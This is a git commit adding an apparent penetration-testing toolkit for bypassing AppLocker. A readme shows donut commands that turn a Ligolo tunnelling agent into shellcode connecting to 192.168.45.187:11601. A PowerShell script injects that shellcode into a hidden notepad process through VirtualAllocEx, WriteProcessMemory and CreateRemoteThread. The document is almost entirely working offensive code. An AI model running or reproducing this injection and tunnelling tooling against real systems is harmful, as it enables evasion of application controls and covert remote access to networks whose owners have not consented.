3e2b413a7dedbf0d552b37200f8a0b8901c6ab3f
blu3drag0nsec@gmail.com <blu3drag0nsec@gmail.com>
2025-08-09 07:54:18 -0400

    chore: applocker

---
+++ tools/06.applocker/ligolo-msbuild/readme.md
@@ -0,0 +1,9 @@
+# Notes
+
+```bash
+donut -f 1 -o agent.bin -a 2 -p "-connect 192.168.45.187:11601 -ignore-cert" -i agent.exe
+```
+
+```bash
+donut -f 1 -o agent2.bin -a 2 -t -p "-connect 192.168.45.187:11601 -ignore-cert" -i agent.exe
+```
---
+++ tools/06.applocker/ligolo-powershell/Ligolo-AppLockerBypass.ps1
@@ -0,0 +1,55 @@
+Start-Process notepad.exe -WindowStyle Hidden
+$shellcode = [System.IO.File]::ReadAllBytes("C:\Windows\Tasks\agent.bin")
+$procid = (Get-Process -Name notepad).Id
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+
+public class Kernel32 {
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool CloseHandle(IntPtr hObject);
+}
+"@ -Language CSharp
+
+$PROCESS_ALL_ACCESS = 0x1F0FFF
+$MEM_COMMIT = 0x1000
+$MEM_RESERVE = 0x2000
+$PAGE_EXECUTE_READWRITE = 0x40
+
+$hProcess = [Kernel32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $procid)
+if ($hProcess -eq [IntPtr]::Zero) {
+    Write-Error "Failed to open process."
+    exit
+}
+$size = $shellcode.Length
+$addr = [Kernel32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$size, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_EXECUTE_READWRITE)
+if ($addr -eq [IntPtr]::Zero) {
+    Write-Error "Failed to allocate memory in the target process."
+    [Kernel32]::CloseHandle($hProcess)
+    exit
+}
+$out = 0
+$result = [Kernel32]::WriteProcessMemory($hProcess, $addr, $shellcode, [uint32]$size, [ref]$out)
+if (-not $result) {
+    Write-Error "Failed to write shellcode to the target process."
+    [Kernel32]::CloseHandle($hProcess)
+    exit
+}
+$thread = [Kernel32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+if ($thread -eq [IntPtr]::Zero) {
+    Write-Error "Failed to create remote thread in the target process."
+}
+[Kernel32]::CloseHandle($hProcess)
+Write-Output "Ligolo Agent Shellcode injected successfully, check the Ligolo Proxy Server interface!"
